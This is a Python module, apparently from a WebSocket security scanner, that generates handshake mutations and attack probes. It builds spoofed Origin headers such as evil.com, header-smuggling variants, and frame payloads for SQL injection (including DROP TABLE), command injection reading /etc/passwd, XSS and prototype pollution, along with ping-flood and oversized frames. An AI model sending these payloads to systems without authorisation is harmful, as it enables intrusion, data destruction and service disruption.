"""websocket: Payload generation."""
from __future__ import annotations

import base64
import hashlib
import os
import secrets
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from argus.collectors.websocket.models import WebSocketMutationStrategy


class WebSocketPayloadGenerator:
    """Generates RFC 6455 handshake requests, mutations, frame injections, and protocol fuzzers."""

    RFC6455_MAGIC_GUID: str = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

    @classmethod
    def generate_sec_websocket_key(cls) -> str:
        """Generates a cryptographically random 16-byte Base64-encoded Sec-WebSocket-Key."""
        random_bytes = os.urandom(16)
        return base64.b64encode(random_bytes).decode("utf-8")

    @classmethod
    def compute_sec_websocket_accept(cls, key: str) -> str:
        """
        Computes the expected RFC 6455 §4.2.2 Sec-WebSocket-Accept header value.
        Sec-WebSocket-Accept = Base64(SHA-1(Key + RFC6455_MAGIC_GUID))
        """
        combined = (key.strip() + cls.RFC6455_MAGIC_GUID).encode("utf-8")
        sha1_hash = hashlib.sha1(combined).digest()
        return base64.b64encode(sha1_hash).decode("utf-8")

    @classmethod
    def build_handshake_headers(
        cls,
        url: str,
        origin: Optional[str] = None,
        subprotocols: Optional[List[str]] = None,
        extensions: Optional[List[str]] = None,
        key: Optional[str] = None,
        custom_headers: Optional[Dict[str, str]] = None,
    ) -> Tuple[Dict[str, str], str]:
        """
        Constructs standard RFC 6455 HTTP/1.1 Upgrade headers.
        Returns a tuple of (headers_dict, sec_websocket_key).
        """
        ws_key = key or cls.generate_sec_websocket_key()
        parsed = urllib.parse.urlparse(url)
        host = parsed.netloc or "localhost"

        headers: Dict[str, str] = {
            "Host": host,
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": "13",
        }

        if origin:
            headers["Origin"] = origin
        else:
            # Standard same-origin default
            scheme = "https" if parsed.scheme in ("wss", "https") else "http"
            headers["Origin"] = f"{scheme}://{host}"

        if subprotocols:
            headers["Sec-WebSocket-Protocol"] = ", ".join(subprotocols)

        if extensions:
            headers["Sec-WebSocket-Extensions"] = "; ".join(extensions)

        if custom_headers:
            headers.update(custom_headers)

        return headers, ws_key

    @classmethod
    def generate_origin_mutations(
        cls,
        target_url: str,
        key: Optional[str] = None,
    ) -> List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]]:
        """
        Generates 6 distinct Origin manipulation headers targeting CSWSH filter weaknesses.
        Returns list of (strategy, headers_dict, origin_string).
        """
        parsed = urllib.parse.urlparse(target_url)
        target_host = parsed.netloc or "target.example.com"
        ws_key = key or cls.generate_sec_websocket_key()

        base_headers: Dict[str, str] = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": "13",
            "Host": target_host,
        }

        mutations: List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]] = []

        # 1. Null Origin (Sandboxed iframe / privacy mode simulation)
        h_null = dict(base_headers)
        h_null["Origin"] = "null"
        mutations.append((WebSocketMutationStrategy.ORIGIN_MANIPULATION, h_null, "null"))

        # 2. Arbitrary Attacker Origin
        h_evil = dict(base_headers)
        h_evil["Origin"] = "https://evil.com"
        mutations.append((WebSocketMutationStrategy.ORIGIN_MANIPULATION, h_evil, "https://evil.com"))

        # 3. Subdomain Suffix Matching Bypass (e.g. target.com.attacker.com)
        h_suffix = dict(base_headers)
        h_suffix["Origin"] = f"https://{target_host}.attacker.com"
        mutations.append((WebSocketMutationStrategy.ORIGIN_MANIPULATION, h_suffix, f"https://{target_host}.attacker.com"))

        # 4. Prefix Matching Bypass (e.g. attackertarget.com)
        clean_host = target_host.split(":")[0]
        h_prefix = dict(base_headers)
        h_prefix["Origin"] = f"https://attacker{clean_host}"
        mutations.append((WebSocketMutationStrategy.ORIGIN_MANIPULATION, h_prefix, f"https://attacker{clean_host}"))

        # 5. Insecure Scheme Downgrade (http vs https)
        h_scheme = dict(base_headers)
        h_scheme["Origin"] = f"http://{target_host}"
        mutations.append((WebSocketMutationStrategy.ORIGIN_MANIPULATION, h_scheme, f"http://{target_host}"))

        # 6. Origin Casing Variation
        h_case = dict(base_headers)
        h_case["Origin"] = f"https://{target_host.upper()}"
        mutations.append((WebSocketMutationStrategy.ORIGIN_MANIPULATION, h_case, f"https://{target_host.upper()}"))

        return mutations

    @classmethod
    def generate_subprotocol_mutations(
        cls,
        target_url: str,
        key: Optional[str] = None,
    ) -> List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]]:
        """
        Generates Subprotocol tampering probes targeting administrative and unauthenticated routing.
        """
        parsed = urllib.parse.urlparse(target_url)
        target_host = parsed.netloc or "target.example.com"
        ws_key = key or cls.generate_sec_websocket_key()

        base_headers: Dict[str, str] = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": "13",
            "Host": target_host,
            "Origin": f"https://{target_host}",
        }

        subproto_tests = [
            "admin, superuser, internal",
            "debug, raw, diagnostics",
            "graphql-ws, graphql-transport-ws",
            "chat, admin, v1.proto, *",
            "graphql-ws\t",
        ]

        mutations: List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]] = []
        for proto in subproto_tests:
            h = dict(base_headers)
            h["Sec-WebSocket-Protocol"] = proto
            mutations.append((WebSocketMutationStrategy.SUBPROTOCOL_TAMPERING, h, proto))

        return mutations

    @classmethod
    def generate_hop_by_hop_mutations(
        cls,
        target_url: str,
        key: Optional[str] = None,
    ) -> List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]]:
        """
        Generates Hop-by-Hop and Upgrade header smuggling variants to bypass reverse proxy filters.
        """
        parsed = urllib.parse.urlparse(target_url)
        target_host = parsed.netloc or "target.example.com"
        ws_key = key or cls.generate_sec_websocket_key()

        variants = [
            ({"Connection": "keep-alive, Upgrade", "Upgrade": "websocket"}, "Connection: keep-alive, Upgrade"),
            ({"Connection": "close, Upgrade", "Upgrade": "websocket"}, "Connection: close, Upgrade"),
            ({"Connection": "Upgrade", "Upgrade": "WebSocket"}, "Upgrade: WebSocket (cased)"),
            ({"Connection": "Upgrade, X-Forwarded-For", "Upgrade": "websocket; "}, "Trailing whitespace in Upgrade"),
        ]

        mutations: List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]] = []
        for extra_hdrs, desc in variants:
            h: Dict[str, str] = {
                "Sec-WebSocket-Key": ws_key,
                "Sec-WebSocket-Version": "13",
                "Host": target_host,
                "Origin": f"https://{target_host}",
            }
            h.update(extra_hdrs)
            mutations.append((WebSocketMutationStrategy.HOP_BY_HOP_SMUGGLING, h, desc))

        return mutations

    @classmethod
    def generate_casing_whitespace_mutations(
        cls,
        target_url: str,
        key: Optional[str] = None,
    ) -> List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]]:
        """
        Generates header casing and whitespace variation probes.
        """
        parsed = urllib.parse.urlparse(target_url)
        target_host = parsed.netloc or "target.example.com"
        ws_key = key or cls.generate_sec_websocket_key()

        variants = [
            ({"upgrade": "websocket", "connection": "upgrade"}, "lowercase upgrade/connection"),
            ({"UPGRADE": "WEBSOCKET", "CONNECTION": "UPGRADE"}, "uppercase UPGRADE/CONNECTION"),
            ({"Upgrade": " websocket ", "Connection": " Upgrade "}, "padded whitespace in values"),
            ({"Sec-WebSocket-Key": f"{ws_key}  ", "Sec-WebSocket-Version": "13", "Upgrade": "websocket", "Connection": "Upgrade"}, "trailing whitespace in WS key"),
        ]

        mutations: List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]] = []
        for extra_hdrs, desc in variants:
            h: Dict[str, str] = {
                "Sec-WebSocket-Key": ws_key,
                "Sec-WebSocket-Version": "13",
                "Host": target_host,
                "Origin": f"https://{target_host}",
            }
            h.update(extra_hdrs)
            mutations.append((WebSocketMutationStrategy.CASING_WHITESPACE_MUTATION, h, desc))

        return mutations

    @classmethod
    def generate_extension_deflate_mutations(
        cls,
        target_url: str,
        key: Optional[str] = None,
    ) -> List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]]:
        """
        Generates WebSocket compression/extension fuzzing probes (permessage-deflate).
        """
        parsed = urllib.parse.urlparse(target_url)
        target_host = parsed.netloc or "target.example.com"
        ws_key = key or cls.generate_sec_websocket_key()

        base_headers: Dict[str, str] = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": "13",
            "Host": target_host,
            "Origin": f"https://{target_host}",
        }

        ext_tests = [
            "permessage-deflate; client_max_window_bits=15",
            "permessage-deflate; client_no_context_takeover; server_no_context_takeover",
            "permessage-deflate; client_max_window_bits=99999",
            "unknown-extension-fuzz, x-webkit-deflate-frame",
        ]

        mutations: List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]] = []
        for ext in ext_tests:
            h = dict(base_headers)
            h["Sec-WebSocket-Extensions"] = ext
            mutations.append((WebSocketMutationStrategy.EXTENSION_DEFLATE_FUZZING, h, ext))

        return mutations

    @classmethod
    def generate_parameter_auth_bypass_mutations(
        cls,
        target_url: str,
        token: str = "secret_token_123",
        key: Optional[str] = None,
    ) -> List[Tuple[WebSocketMutationStrategy, str, Dict[str, str], str]]:
        """
        Generates authentication parameter manipulation probes across URL queries and headers.
        Returns list of (strategy, modified_url, headers_dict, description).
        """
        parsed = urllib.parse.urlparse(target_url)
        target_host = parsed.netloc or "target.example.com"
        ws_key = key or cls.generate_sec_websocket_key()

        base_headers: Dict[str, str] = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": "13",
            "Host": target_host,
            "Origin": f"https://{target_host}",
        }

        probes: List[Tuple[WebSocketMutationStrategy, str, Dict[str, str], str]] = []

        # 1. Query token variations
        for param in ("token", "access_token", "apiKey", "ticket", "auth"):
            sep = "&" if "?" in target_url else "?"
            mutated_url = f"{target_url}{sep}{param}={token}"
            probes.append((
                WebSocketMutationStrategy.PARAMETER_AUTHENTICATION_BYPASS,
                mutated_url,
                dict(base_headers),
                f"Query parameter token leakage: {param}",
            ))

        # 2. Stripped / Null tokens
        sep = "&" if "?" in target_url else "?"
        probes.append((
            WebSocketMutationStrategy.PARAMETER_AUTHENTICATION_BYPASS,
            f"{target_url}{sep}token=null",
            dict(base_headers),
            "Stripped token (?token=null)",
        ))

        # 3. Header vs Query conflict (Bearer header + invalid query token)
        h_conflict = dict(base_headers)
        h_conflict["Authorization"] = f"Bearer {token}"
        probes.append((
            WebSocketMutationStrategy.PARAMETER_AUTHENTICATION_BYPASS,
            f"{target_url}{sep}token=invalid_token",
            h_conflict,
            "Conflicting Authorization header and query token",
        ))

        return probes

    # Frame-level injection vectors
    @classmethod
    def generate_frame_sqli_payloads(cls) -> List[Dict[str, Any]]:
        """Generates structured JSON and text frame SQL injection payloads."""
        return [
            {"action": "query", "id": "1' OR '1'='1 --"},
            {"type": "search", "term": "admin' UNION SELECT @@version, user() --"},
            {"filter": "'; DROP TABLE messages; --"},
            {"user": "admin' --", "password": "password"},
            {"raw_text": "1' OR '1'='1' --"},
        ]

    @classmethod
    def generate_frame_cmdi_payloads(cls) -> List[Dict[str, Any]]:
        """Generates structured JSON and text frame OS command injection payloads."""
        return [
            {"action": "ping", "host": "127.0.0.1; id"},
            {"exec": "| whoami"},
            {"command": "& cat /etc/passwd"},
            {"action": "diagnostics", "target": "localhost | id ; cat /etc/passwd"},
            {"raw_text": "; id ; cat /etc/passwd"},
        ]

    @classmethod
    def generate_frame_xss_payloads(cls) -> List[Dict[str, Any]]:
        """Generates structured JSON and text frame Cross-Site Scripting (XSS) payloads."""
        return [
            {"action": "message", "content": "<script>alert('ARGUS_WS_XSS')</script>"},
            {"chat": "<img src=x onerror=alert(1)>"},
            {"title": "<svg onload=alert(1)>"},
            {"raw_text": "<script>alert('ARGUS_WS_XSS')</script>"},
        ]

    @classmethod
    def generate_frame_prototype_pollution_payloads(cls) -> List[Dict[str, Any]]:
        """Generates prototype pollution frame payloads."""
        return [
            {"__proto__": {"admin": True, "polluted": True}},
            {"constructor": {"prototype": {"isAdmin": True, "role": "superuser"}}},
            {"payload": {"__proto__": {"polluted": True}}},
        ]

    @classmethod
    def generate_unmasked_frame_payload(cls, message: str = "ARGUS_UNMASKED_PROBE") -> bytes:
        """
        Constructs an RFC 6455 unmasked client text frame (violating RFC 6455 §5.1).
        Byte 0: 0x81 (FIN=1, Opcode=1 for text)
        Byte 1: Mask bit = 0, Payload Length
        """
        payload_bytes = message.encode("utf-8")
        length = len(payload_bytes)
        if length < 126:
            # Mask bit is 0 -> length byte has MSB = 0
            header = bytes([0x81, length])
        elif length < 65536:
            header = bytes([0x81, 126, (length >> 8) & 0xFF, length & 0xFF])
        else:
            header = bytes([0x81, 127]) + length.to_bytes(8, byteorder="big")
        return header + payload_bytes

    @classmethod
    def generate_oversized_frame_header(cls) -> bytes:
        """Constructs an RFC 6455 frame header declaring a 64-bit oversized length (16MB+)."""
        # Declares length = 0x0000000001000000 (16MB)
        declared_len = 16 * 1024 * 1024
        header = bytes([0x81, 0xFE]) + declared_len.to_bytes(8, byteorder="big")
        return header

    @classmethod
    def generate_ping_flood_frames(cls, count: int = 50) -> List[bytes]:
        """Generates a burst of RFC 6455 Ping frames (opcode 0x9) with masked client payloads."""
        frames = []
        for i in range(count):
            mask = secrets.token_bytes(4)
            data = f"ping_{i}".encode("utf-8")
            masked_data = bytes([b ^ mask[j % 4] for j, b in enumerate(data)])
            # 0x89 = FIN=1, Opcode=9 (Ping), 0x80 | len = Mask=1
            header = bytes([0x89, 0x80 | len(data)]) + mask
            frames.append(header + masked_data)
        return frames
